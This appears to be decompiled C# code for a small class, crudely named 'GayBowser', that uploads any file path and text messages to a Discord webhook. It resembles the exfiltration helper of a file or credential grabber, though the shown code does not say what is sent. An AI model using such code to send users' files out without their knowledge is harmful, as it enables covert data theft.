using System;
using System.Collections.Specialized;
using System.Net;

// Token: 0x02000003 RID: 3
public class GayBowser : IDisposable
{
	// Token: 0x06000002 RID: 2 RVA: 0x00002058 File Offset: 0x00000258
	public GayBowser()
	{
		this.browWebClient = new WebClient();
	}

	// Token: 0x06000003 RID: 3 RVA: 0x0000206B File Offset: 0x0000026B
	public void Dispose()
	{
		this.browWebClient.Dispose();
	}

	// Token: 0x06000004 RID: 4 RVA: 0x00002078 File Offset: 0x00000278
	public void SendAttachment(string path)
	{
		this.browWebClient.UploadFile(this.WebHook, path);
	}

	// Token: 0x06000005 RID: 5 RVA: 0x0000208D File Offset: 0x0000028D
	public void SendMessage(string msgSend)
	{
		GayBowser.discordValues.Add("content", msgSend);
		this.browWebClient.UploadValues(this.WebHook, GayBowser.discordValues);
	}

	// Token: 0x17000001 RID: 1
	// (get) Token: 0x06000006 RID: 6 RVA: 0x000020B6 File Offset: 0x000002B6
	// (set) Token: 0x06000007 RID: 7 RVA: 0x000020BE File Offset: 0x000002BE
	public string Attachment { get; set; }

	// Token: 0x17000002 RID: 2
	// (get) Token: 0x06000008 RID: 8 RVA: 0x000020C7 File Offset: 0x000002C7
	// (set) Token: 0x06000009 RID: 9 RVA: 0x000020CF File Offset: 0x000002CF
	public string WebHook { get; set; }

	// Token: 0x04000001 RID: 1
	private readonly WebClient browWebClient;

	// Token: 0x04000002 RID: 2
	private static NameValueCollection discordValues = new NameValueCollection();
}
